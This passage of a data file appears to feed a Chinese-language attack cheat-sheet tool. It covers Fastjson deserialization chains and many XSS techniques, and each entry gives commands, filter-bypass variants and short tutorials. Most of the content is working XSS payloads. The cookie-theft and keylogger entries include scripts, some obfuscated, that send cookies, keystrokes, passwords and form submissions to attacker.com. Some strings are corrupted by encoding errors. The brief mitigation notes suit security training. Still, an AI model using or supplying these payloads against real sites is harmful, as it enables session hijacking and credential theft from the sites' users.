            ],
        description: '针对不同Fastjson版本使用特异性利用链：BCEL ClassLoader加载字节码、1.2.47缓存投毒、1.2.68 expectClass白名单绕过',
      },
    ],
    tutorial: {
      overview: 'Fastjson是阿里巴巴开发的Java JSON库，其autoType功能允许JSON中指定Java类进行反序列化，攻击者可利用此特性加载恶意类实现远程代码执行，影响大量Java应用。',
      vulnerability: 'Fastjson漏洞通过@type字段指定反序列化的Java类：1.2.24以下可直接利用JdbcRowSetImpl触发JNDI注入，1.2.25-1.2.47通过autoType黑名单绕过(java.lang.Class缓存绕过)，1.2.68以下利用expectClass绕过。利用链需配合LDAP/RMI远程加载恶意类。',
      exploitation: '完�利用流程：\n1. 确认Fastjson版本\n2. 构造JNDI注入payload\n3. 搭建恶意LDAP服务\n4. 加载恶意类执行命令',
      mitigation: '防御措施：\n1. 升级Fastjson到最新版本\n2. 禁用AutoType\n3. 配置safeMode\n4. 使用安全过滤器',
      difficulty: 'advanced'
    }
  },
  {
    id: 'xss-mxss',
    name: '突变型XSS(mXSS)',
    description: '利用浏览器解析差异导�的XSS攻击',
    category: 'XSS跨站脚本',
    subCategory: '突变型',
    tags: ['xss', 'mxss', 'mutation', 'bypass'],
    prerequisites: ['存在HTML输出点', '浏览器解析差异'],
    execution: [
      { 
        title: '1. 基础mXSS探测', 
        command: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">', 
        description: '利用noscript标签解析差异', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '<noscript>', explanation: '脚本禁用时显示的内容' },
          { part: 'p title', explanation: '属性值在解析时变化' },
          { part: '</noscript>', explanation: '闭合标签导�突变' }
        ]
      },
      { 
        title: '2. SVG mXSS', 
        command: '<svg><![CDATA[<img src=x onerror=alert(1)>]]></svg>\n<svg><script><![CDATA[alert(1)]]></script></svg>', 
        description: 'SVG CDATA突变', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '<script>', explanation: '脚本标签', type: 'tag' },
          { part: '<img>', explanation: '图片标签', type: 'tag' },
          { part: '<svg>', explanation: 'SVG标签', type: 'tag' },
          { part: 'onerror', explanation: '错误事件处理器', type: 'keyword' }
        ]
      },
      { 
        title: '3. Math mXSS', 
        command: '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>', 
        description: 'MathML突变XSS', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '<img>', explanation: '图片标签', type: 'tag' },
          { part: 'onerror', explanation: '错误事件处理器', type: 'keyword' },
          { part: 'alert()', explanation: '弹窗函数', type: 'function' }
        ]
      },
      { 
        title: '4. DOM clobbering配合', 
        command: '<form id=x></form><form id=x><img src=x onerror=alert(1)></form>', 
        description: '利用DOM clobbering', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'id=x', explanation: '重复ID导�DOM变化' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '嵌套标签绕过', 
        command: '<svg><script>&#97;lert(1)</script></svg>\n<svg><script>a&#108;ert(1)</script></svg>',
            syntaxBreakdown: [
              { part: '<svg>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '&#97;lert(1)', explanation: '注入代码', type: 'value' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '</svg>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n', explanation: '注入代码', type: 'value' },
              { part: '<svg>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: 'a&#108;ert(1)', explanation: '注入代码', type: 'value' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '</svg>', explanation: 'HTML标签/事件处理器', type: 'tag' }
            ],
        description: 'SVG内脚本编码绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'mXSS(Mutation XSS)利用浏览器DOM解析和序列化过程中的差异，使经过安全过滤器处理后的HTML在浏览器渲染时产生新的XSS向量。是绕过DOMPurify等先进过滤器的高级技术。',
      vulnerability: 'mXSS利用innerHTML赋值时的DOM序列化→反序列化差异：某些HTML结构在被解析后再序列化时会产生变异(如SVG/MathML命名空间切换、注释节点解析差异)，使原本安全的HTML变为包含脚本执行能力的代码。',
      exploitation: '完�利用流程：\n1. 研究目标过滤规则\n2. 构造突变payload\n3. 验证解析差异\n4. 执行恶意代码',
      mitigation: '防御措施：\n1. 使用DOMPurify等安全库\n2. 避免innerHTML操作\n3. 使用textContent替代\n4. 定期�新过滤规则',
      difficulty: 'advanced'
    }
  },
  {
    id: 'xss-unicode',
    name: 'Unicode XSS',
    description: '利用Unicode编码特性绕过过滤',
    category: 'XSS跨站脚本',
    subCategory: 'Unicode编码',
    tags: ['xss', 'unicode', 'encoding', 'bypass'],
    prerequisites: ['存在XSS注入点', '过滤器检查关键字'],
    execution: [
      { 
        title: '1. Unicode转义', 
        command: '<script>\\u0061lert(1)</script>\n<script>\\x61lert(1)</script>\n<script>\\u{61}lert(1)</script>', 
        description: 'JavaScript Unicode转义', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '\\u0061', explanation: 'a的Unicode转义（4位）' },
          { part: '\\x61', explanation: 'a的十六进制转义' },
          { part: '\\u{61}', explanation: 'a的Unicode码点转义' }
        ]
      },
      { 
        title: '2. HTML实体编码', 
        command: '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>\n<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>', 
        description: 'HTML十进制/十六进制实体', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '&#97;', explanation: 'a的十进制HTML实体' },
          { part: '&#x61;', explanation: 'a的十六进制HTML实体' }
        ]
      },
      { 
        title: '3. Unicode规范化攻击', 
        command: '使用规范化等效字符:\n＜script＞alert(1)＜/script＞\n使用全角字符绕过', 
        description: '利用Unicode规范化', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '＜', explanation: '全角小于号(U+FF1C)' },
          { part: '＞', explanation: '全角大于号(U+FF1E)' }
        ]
      },
      { 
        title: '4. UTF-7编码', 
        command: '+ADw-script+AD4-alert(1)+ADw-/script+AD4-\n需要页面使用UTF-7编码', 
        description: 'UTF-7编码XSS', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '+ADw-', explanation: 'UTF-7编码的<' },
          { part: '+AD4-', explanation: 'UTF-7编码的>' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '混合编码绕过', 
        command: '<img src=x onerror=\\u0061&#108;ert(1)>\n<img src=x onerror="\\u0061lert`1`">',
            syntaxBreakdown: [
              { part: '<img src=x onerror=\\u0061&#108;ert(1)>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n', explanation: '注入代码', type: 'value' },
              { part: '<img src=x onerror="\\u0061lert`1`">', explanation: 'HTML标签/事件处理器', type: 'tag' }
            ],
        description: '混合多种编码方式', 
        platform: 'all'
      },
      { 
        title: '过长UTF-8编码', 
        command: '<img src=x onerror=alert(1)>\n使用非最短UTF-8编码形式',
            syntaxBreakdown: [
              { part: '<img src=x onerror=alert(1)>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n使用非最短UTF-8编码形式', explanation: '注入代码', type: 'value' }
            ],
        description: '利用服务器UTF-8解析差异', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'Unicode XSS利用Unicode字符编码的复杂性绕过XSS过滤器，包括同形异义字符替换、零宽字符插入、UTF-16/UTF-32编码差异等技术，使恶意脚本在过滤器和浏览器之间产生不同解释。',
      vulnerability: 'Unicode XSS攻击面：1)全角字符替换半角(＜script＞) 2)UTF-7编码绕过(+ADw-script+AD4-) 3)零宽字符(U+200B/U+FEFF)分割关键词 4)Unicode规范化(NFC/NFKC)导致字符变换 5)IDN同形攻击域名绕过过滤。',
      exploitation: '完�利用流程：\n1. 分析编码处理逻辑\n2. 选择合适的编码方式\n3. 绕过关键字过滤\n4. 执行恶意脚本',
      mitigation: '防御措施：\n1. 统一使用UTF-8编码\n2. 输入规范化后再过滤\n3. 使用安全的编码函数\n4. 避免混合编码处理',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'xss-filter-bypass',
    name: 'XSS过滤器绕过',
    description: '各种绕过XSS过滤器的技术',
    category: 'XSS跨站脚本',
    subCategory: '过滤器绕过',
    tags: ['xss', 'filter', 'bypass', 'waf'],
    prerequisites: ['存在XSS注入点', '存在过滤机制'],
    execution: [
      { 
        title: '1. 大小写混淆', 
        command: '<ScRiPt>alert(1)</ScRiPt>\n<IMG SRC=x OnErRoR=alert(1)>\n<SvG OnLoAd=alert(1)>', 
        description: '混合大小写绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'ScRiPt', explanation: '大小写混合的script标签' },
          { part: 'OnErRoR', explanation: '大小写混合的事件处理器' }
        ]
      },
      { 
        title: '2. 双写绕过', 
        command: '<scr<script>ipt>alert(1)</scr</script>ipt>\n<imimgg src=x onerror=alert(1)>', 
        description: '双写绕过关键字删除', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'scr<script>ipt', explanation: '中�的script被删除后形成完�标签' }
        ]
      },
      { 
        title: '3. 注释混淆', 
        command: '<script>/**/alert(1)/**/</script>\n<img src=x/**/onerror=alert(1)>\n<svg on<!--test-->load=alert(1)>', 
        description: '使用注释混淆', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '/**/', explanation: 'JavaScript注释' },
          { part: '<!--test-->', explanation: 'HTML注释' }
        ]
      },
      { 
        title: '4. 空字节截断', 
        command: '<scr\\x00ipt>alert(1)</script>\n<img src=x onerror=alert\\x00(1)>', 
        description: '空字节截断绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '\\x00', explanation: '空字节，某些过滤器会在此截断' }
        ]
      },
      { 
        title: '5. 标签属性绕过', 
        command: '<img src=x onerror=alert(1)>\n<img src=x onerror =alert(1)>\n<img src=x onerror\t=alert(1)>\n<img src=x onerror\n=alert(1)>', 
        description: '利用空白字符绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'onerror =', explanation: '等号前加空格' },
          { part: 'onerror\t=', explanation: '等号前加Tab' }
        ]
      },
      { 
        title: '6. 事件处理器变体', 
        command: '<body onpageshow=alert(1)>\n<input onfocus=alert(1) autofocus>\n<marquee onstart=alert(1)>\n<video><source onerror=alert(1)>\n<details open ontoggle=alert(1)>\n<audio src=x onerror=alert(1)>',
            syntaxBreakdown: [
              { part: '<body onpageshow=alert(1)>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n', explanation: '注入代码', type: 'value' },
              { part: '<input onfocus=alert(1) autofocus>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n', explanation: '注入代码', type: 'value' },
              { part: '<marquee onstart=alert(1)>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n', explanation: '注入代码', type: 'value' },
              { part: '<video>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<source onerror=alert(1)>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n', explanation: '注入代码', type: 'value' },
              { part: '<details open ontoggle=alert(1)>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n', explanation: '注入代码', type: 'value' },
              { part: '<audio src=x onerror=alert(1)>', explanation: 'HTML标签/事件处理器', type: 'tag' }
            ],
        description: '使用少见的事件处理器', 
        },
      ],
    wafBypass: [
      { 
        title: 'Data URI绕过', 
        command: '<a href="data:text/html,<script>alert(1)</script>">click</a>\n<iframe src="data:text/html,<script>alert(1)</script>">',
            syntaxBreakdown: [
              { part: '<a href="data:text/html,<script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: 'alert(1)', explanation: '注入代码', type: 'value' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '">click', explanation: '注入代码', type: 'value' },
              { part: '</a>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n', explanation: '注入代码', type: 'value' },
              { part: '<iframe src="data:text/html,<script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: 'alert(1)', explanation: '注入代码', type: 'value' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '">', explanation: '注入代码', type: 'value' }
            ],
        description: '使用Data URI', 
        platform: 'all'
      },
      { 
        title: 'SVG动画绕过', 
        command: '<svg><animate onbegin=alert(1)>\n<svg><set onbegin=alert(1)>',
            syntaxBreakdown: [
              { part: '<svg>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<animate onbegin=alert(1)>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n', explanation: '注入代码', type: 'value' },
              { part: '<svg>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<set onbegin=alert(1)>', explanation: 'HTML标签/事件处理器', type: 'tag' }
            ],
        description: 'SVG动画事件', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'XSS过滤器绕过是实战中最核心的技能，需要深入理解各种过滤规则的实现缺陷，通过HTML标签变体、事件处理器替换、编码混合、DOM特性利用等方式构造有效的XSS向量。',
      vulnerability: 'XSS过滤器绕过技术矩阵：1)黑名单绕过(使用非常见标签如<svg>/<details>/<marquee>) 2)事件处理器替换(onfocus/onmouseover代替onclick) 3)属性注入(autofocus配合onfocus) 4)协议绕过(javascript:/data:) 5)HTML实体编码嵌套。',
      exploitation: '完�利用流程：\n1. 分析过滤规则\n2. 测试各种绕过技术\n3. 找到有效的payload\n4. 执行恶意代码',
      mitigation: '防御措施：\n1. 使用白名单过滤\n2. 输出编码而非输入过滤\n3. 使用CSP策略\n4. 定期�新过滤规则',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'xss-encoding',
    name: 'XSS编码绕过',
    description: '利用各种编码技术绕过XSS过滤',
    category: 'XSS跨站脚本',
    subCategory: '编码绕过',
    tags: ['xss', 'encoding', 'bypass'],
    prerequisites: ['存在XSS注入点', '存在编码处理'],
    execution: [
      { 
        title: '1. URL编码', 
        command: '<img src=x onerror=%61lert(1)>\n%3Cscript%3Ealert(1)%3C/script%3E', 
        description: 'URL编码绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '%61', explanation: 'a的URL编码' },
          { part: '%3C', explanation: '<的URL编码' },
          { part: '%3E', explanation: '>的URL编码' }
        ]
      },
      { 
        title: '2. HTML实体编码', 
        command: '<img src=x onerror=&#97;lert(1)>\n<img src=x onerror=&#x61;lert(1)>\n&lt;script&gt;alert(1)&lt;/script&gt;', 
        description: 'HTML实体编码', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '&#97;', explanation: 'a的十进制HTML实体' },
          { part: '&#x61;', explanation: 'a的十六进制HTML实体' },
          { part: '&lt;', explanation: '<的命名实体' }
        ]
      },
      { 
        title: '3. JavaScript编码', 
        command: '<img src=x onerror="\\u0061lert(1)">\n<img src=x onerror="\\x61lert(1)">\n<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">', 
        description: 'JavaScript编码', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '\\u0061', explanation: 'Unicode转义' },
          { part: 'atob()', explanation: 'Base64解码函数' },
          { part: 'YWxlcnQoMSk=', explanation: 'alert(1)的Base64' }
        ]
      },
      { 
        title: '4. CSS编码', 
        command: '<style>body{background:url("javascript:alert(1)")}</style>\n<div style="x:expression(alert(1))">',
            syntaxBreakdown: [
              { part: '<style>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: 'body{background:url("javascript:alert(1)")}', explanation: '注入代码', type: 'value' },
              { part: '</style>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n', explanation: '注入代码', type: 'value' },
              { part: '<div style="x:expression(alert(1))">', explanation: 'HTML标签/事件处理器', type: 'tag' }
            ],
        description: 'CSS编码（旧版IE）', 
        platform: 'all'
      },
      { 
        title: '5. 混合编码', 
        command: '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">\n<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>',
            syntaxBreakdown: [
              { part: '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n', explanation: '注入代码', type: 'value' },
              { part: '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: 'click', explanation: '注入代码', type: 'value' },
              { part: '</a>', explanation: 'HTML标签/事件处理器', type: 'tag' }
            ],
        description: '混合多种编码', 
        },
      ],
    wafBypass: [
      { 
        title: '双重URL编码', 
        command: '%253Cscript%253Ealert(1)%253C/script%253E\n服务器解码两次时使用',
            syntaxBreakdown: [
              { part: '%253Cscript%253Ealert(1)%253C/script%253E\n服务器解码两次时使用', explanation: '注入代码', type: 'value' }
            ],
        description: '双重URL编码', 
        platform: 'all'
      },
      { 
        title: 'UTF-16编码', 
        command: '%00%3C%00s%00c%00r%00i%00p%00t%00%3Ealert(1)%00%3C/s%00c%00r%00i%00p%00t%00%3E',
            syntaxBreakdown: [
              { part: '%00%3C%00s%00c%00r%00i%00p%00t%00%3Ealert(1)%00%3C/s%00c%00r%00i%00p%00t%00%3E', explanation: '注入代码', type: 'value' }
            ],
        description: 'UTF-16编码绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'XSS编码绕过利用多层编码(HTML实体、URL编码、JavaScript编码、Unicode)和浏览器的解码顺序差异，使payload在过滤器检查时不被识别但在浏览器渲染时被正确解析执行。',
      vulnerability: 'XSS多层编码攻击：1)HTML实体编码(&#x6A;avascript:alert(1)) 2)双重URL编码(%253Cscript%253E) 3)JavaScript unicode转义(\u0061lert) 4)八进制/十六进制编码 5)混合编码(HTML实体+JS编码) 6)Base64 data URI(data:text/html;base64,PHN...)。',
      exploitation: '完�利用流程：\n1. 分析编码处理流程\n2. 选择合适的编码方式\n3. 构造编码后的payload\n4. 验证绕过效果',
      mitigation: '防御措施：\n1. 统一编码处理\n2. 避免多次解码\n3. 输出时进行编码\n4. 使用安全的编码函数',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'xss-polyglot',
    name: 'Polyglot XSS',
    description: '多环境通用的XSS payload',
    category: 'XSS跨站脚本',
    subCategory: 'Polyglot',
    tags: ['xss', 'polyglot', 'universal'],
    prerequisites: ['存在XSS注入点', '不确定具体环境'],
    execution: [
      { 
        title: '1. 经典Polyglot', 
        command: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", 
        description: '经典多环境Polyglot', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'jaVasCript:', explanation: 'JavaScript协议，大小写混合' },
          { part: '/*-/*`/*\\`/*', explanation: '注释和模板字符串混淆' },
          { part: 'oNcLiCk=alert()', explanation: '点击事件' },
          { part: '</stYle/</titLe', explanation: '闭合多种标签' },
          { part: '<sVg/oNloAd=alert()', explanation: 'SVG标签XSS' }
        ]
      },
      { 
        title: '2. 短Polyglot', 
        command: "'\"-->]]>*/</script></style></title></textarea><script>alert(1)</script>", 
        description: '短版本Polyglot', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '<script>', explanation: '脚本标签', type: 'tag' },
          { part: 'alert()', explanation: '弹窗函数', type: 'function' }
        ]
      },
      { 
        title: '3. 属性注入Polyglot', 
        command: "'onmouseover=alert(1) x='\n\"onfocus=alert(1) autofocus x=\"\n'onclick=alert(1)//", 
        description: '属性值注入Polyglot', 
        platform: 'all'
      },
      { 
        title: '4. URL参数Polyglot', 
        command: "javascript:alert(1)//http://\ndata:text/html,<script>alert(1)</script>", 
        description: 'URL参数Polyglot', 
        syntaxBreakdown: [
          { part: '<script>', explanation: '脚本标签', type: 'tag' },
          { part: 'alert()', explanation: '弹窗函数', type: 'function' }
        ]
        },
      ],
    wafBypass: [
      { 
        title: '高级Polyglot', 
        command: "-->'\"<svg onload=alert(1)>\"><script>alert(1)</script>", 
        description: '简�高效Polyglot', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '<script>', explanation: '脚本标签', type: 'tag' },
          { part: '<svg>', explanation: 'SVG标签', type: 'tag' },
          { part: 'onload', explanation: '加载事件处理器', type: 'keyword' },
          { part: 'alert()', explanation: '弹窗函数', type: 'function' }
        ]
      }
    ],
    tutorial: {
      overview: 'XSS Polyglot是一种在多种上下文(HTML/JS/属性/URL/CSS)中均能触发执行的通用XSS payload，一个精心构造的字符串可同时适用于不同注入点，极大提高了Fuzzing效率。',
      vulnerability: 'Polyglot XSS利用HTML/JS/CSS解析器的容错机制：一个payload包含闭合引号、HTML标签、JS注释、事件处理器等多种元素，使其在作为HTML属性值、JS字符串、CSS值或URL参数时都能逃逸上下文并执行脚本。',
      exploitation: '完�利用流程：\n1. 使用Polyglot探测注入点\n2. 观察payload在哪个上下文执行\n3. 根据结果调�攻击策略',
      mitigation: '防御措施：\n1. 严格区分输入上下文\n2. 针对性编码输出\n3. 使用CSP策略\n4. 输入验证和白名单',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'xss-cookie-theft',
    name: 'XSS Cookie窃取',
    description: '利用XSS窃取用户Cookie',
    category: 'XSS跨站脚本',
    subCategory: 'Cookie窃取',
    tags: ['xss', 'cookie', 'theft', 'session'],
    prerequisites: ['存在XSS漏�', 'Cookie未设置HttpOnly'],
    execution: [
      { 
        title: '1. 基础Cookie窃取', 
        command: '<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>', 
        description: '使用Image对象发送Cookie', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'new Image()', explanation: '创建图片对象' },
          { part: '.src', explanation: '设置图片源触发HTTP请求' },
          { part: 'document.cookie', explanation: '获取当前页面Cookie' }
        ]
      },
      { 
        title: '2. Fetch API窃取', 
        command: '<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>\n<script>navigator.sendBeacon("http://attacker.com/steal", document.cookie)</script>', 
        description: '使用Fetch/Beacon API', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'fetch()', explanation: '现代HTTP请求API' },
          { part: 'sendBeacon()', explanation: '异步发送数据，不阻塞页面' }
        ]
      },
      { 
        title: '3. XMLHttpRequest窃取', 
        command: '<script>\nvar xhr = new XMLHttpRequest();\nxhr.open("GET", "http://attacker.com/steal?c="+document.cookie, true);\nxhr.send();\n</script>',
            syntaxBreakdown: [
              { part: '<script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\nvar xhr = new XMLHttpRequest();\nxhr.open("GET", "http://attacker.com/steal?c="+document.cookie, true);\nxhr.send();\n', explanation: '注入代码', type: 'value' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' }
            ],
        description: '使用XHR发送', 
        platform: 'all'
      },
      { 
        title: '4. 编码传输', 
        command: '<script>\nvar data = btoa(document.cookie);\nnew Image().src="http://attacker.com/steal?c="+data;\n</script>', 
        description: 'Base64编码传输', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'btoa()', explanation: 'Base64编码函数' }
        ]
      },
      { 
        title: '5. 完�利用脚本', 
        command: '<script>\nvar img = new Image();\nimg.src = "http://attacker.com/log?cookie=" + encodeURIComponent(document.cookie) + "&location=" + encodeURIComponent(location.href) + "&ua=" + encodeURIComponent(navigator.userAgent);\n</script>',
            syntaxBreakdown: [
              { part: '<script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\nvar img = new Image();\nimg.src = "http://attacker.com/log?cookie=" + encodeURIComponent(document.cookie) + "&location=" + encodeURIComponent(location.href) + "&ua=" + encodeURIComponent(navigator.userAgent);\n', explanation: '注入代码', type: 'value' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' }
            ],
        description: '收集完�信息', 
        },
      ],
    wafBypass: [
      { 
        title: '混淆绕过', 
        command: '<script>var _0x1234="cookie";eval("new Image().src=\\"http://attacker.com/?c="+document[_0x1234]+"\\"")</script>',
            syntaxBreakdown: [
              { part: '<script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: 'var _0x1234="cookie";eval("new Image().src=\\"http://attacker.com/?c="+document[_0x1234]+"\\"")', explanation: '注入代码', type: 'value' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' }
            ],
        description: '变量混淆绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'XSS Cookie窃取是最经典的XSS利用方式之一，通过注入的脚本读取document.cookie并发送到攻击者控制的服务器，从而劫持用户会话。HttpOnly标志可有效防御此攻击。',
      vulnerability: 'Cookie窃取攻击利用JavaScript的document.cookie API读取所有未设置HttpOnly标志的Cookie，通过Image对象/fetch/XMLHttpRequest等方式将Cookie外发到攻击者服务器。获取Cookie后可直接劫持用户会话登录账户。',
      exploitation: '完�利用流程：\n1. 发现XSS漏�\n2. 构造Cookie窃取脚本\n3. 诱使受害者触发\n4. 获取Cookie接管会话',
      mitigation: '防御措施：\n1. 设置HttpOnly标志\n2. 设置Secure标志\n3. 使用SameSite属性\n4. 实施会话绑定验证',
      difficulty: 'beginner'
    }
  },
  {
    id: 'xss-keylogger',
    name: 'XSS键盘记录',
    description: '利用XSS记录用户键盘输入',
    category: 'XSS跨站脚本',
    subCategory: '键盘记录',
    tags: ['xss', 'keylogger', 'credential'],
    prerequisites: ['存在存储型XSS', '目标页面有敏感输入'],
    execution: [
      { 
        title: '1. 基础键盘记录', 
        command: '<script>\ndocument.addEventListener("keypress", function(e){\n  new Image().src = "http://attacker.com/log?key=" + e.key;\n});\n</script>', 
        description: '监听键盘按键', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'addEventListener', explanation: '添加事件监听器' },
          { part: 'keypress', explanation: '键盘按下事件' },
          { part: 'e.key', explanation: '按下的键值' }
        ]
      },
      { 
        title: '2. 完�键盘记录', 
        command: '<script>\nvar buffer = "";\ndocument.addEventListener("keydown", function(e){\n  if(e.key === "Enter"){\n    new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(buffer);\n    buffer = "";\n  } else {\n    buffer += e.key;\n  }\n});\n</script>',
            syntaxBreakdown: [
              { part: '<script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\nvar buffer = "";\ndocument.addEventListener("keydown", function(e){\n  if(e.key === "Enter"){\n    new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(buffer);\n    buffer = "";\n  } else {\n    buffer += e.key;\n  }\n});\n', explanation: '注入代码', type: 'value' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' }
            ],
        description: '按Enter发送记录', 
        platform: 'all'
      },
      { 
        title: '3. 表单窃取', 
        command: '<script>\ndocument.querySelectorAll("input[type=password]").forEach(function(input){\n  input.addEventListener("change", function(){\n    new Image().src = "http://attacker.com/log?pwd=" + this.value;\n  });\n});\n</script>', 
        description: '窃取密码字段', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'querySelectorAll', explanation: '选择所有匹配元�' },
          { part: 'input[type=password]', explanation: '密码输入框选择器' },
          { part: 'change', explanation: '值改变事件' }
        ]
      },
      { 
        title: '4. 表单提交劫持', 
        command: '<script>\ndocument.querySelectorAll("form").forEach(function(form){\n  form.addEventListener("submit", function(e){\n    var data = new FormData(this);\n    new Image().src = "http://attacker.com/log?" + new URLSearchParams(data).toString();\n  });\n});\n</script>',
            syntaxBreakdown: [
              { part: '<script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\ndocument.querySelectorAll("form").forEach(function(form){\n  form.addEventListener("submit", function(e){\n    var data = new FormData(this);\n    new Image().src = "http://attacker.com/log?" + new URLSearchParams(data).toString();\n  });\n});\n', explanation: '注入代码', type: 'value' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' }
            ],
        description: '劫持表单提交', 
        },
      ],
    wafBypass: [
      { 
        title: '混淆版本', 
        command: '<script>var _0xa=["\\x6b\\x65\\x79\\x64\\x6f\\x77\\x6e","\\x61\\x64\\x64\\x45\\x76\\x65\\x6e\\x74\\x4c\\x69\\x73\\x74\\x65\\x6e\\x65\\x72"];document[_0xa[1]](_0xa[0],function(_0xb){new Image().src="http://attacker.com/?k="+_0xb[_0xa[0]]})</script>',
            syntaxBreakdown: [
              { part: '<script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: 'var _0xa=["\\x6b\\x65\\x79\\x64\\x6f\\x77\\x6e","\\x61\\x64\\x64\\x45\\x76\\x65\\x6e\\x74\\x4c\\x69\\x73\\x74\\x65\\x6e\\x65\\x72"];document[_0xa[1]](_0xa[0],function(_0xb){new Image().src="http://attacker.com/?k="+_0xb[_0xa[0]]})', explanation: '注入代码', type: 'value' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' }
            ],
        description: '十六进制混淆', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'XSS键盘记录器通过注入JavaScript事件监听器捕获用户的所有键盘输入，包括密码、信用卡号等敏感信息，并实时发送给攻击者，比Cookie窃取危害更大且更隐蔽。',
      vulnerability: 'XSS键盘记录利用addEventListener监听keypress/keydown/input事件，捕获用户在页面上的所有键盘输入。攻击者可针对特定输入框(如密码框)监听，将捕获的按键通过Image beacon或WebSocket实时外发，用户完全无感知。',
      exploitation: '完�利用流程：\n1. 注入键盘记录脚本\n2. 持续收集按键数据\n3. 发送到攻击者服务器\n4. 分析获取敏感信息',
      mitigation: '防御措施：\n1. 严格的XSS防护\n2. 使用虚拟键盘输入敏感信息\n3. 实施内容安全策略\n4. 监控异常脚本行为',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'xss-beef',
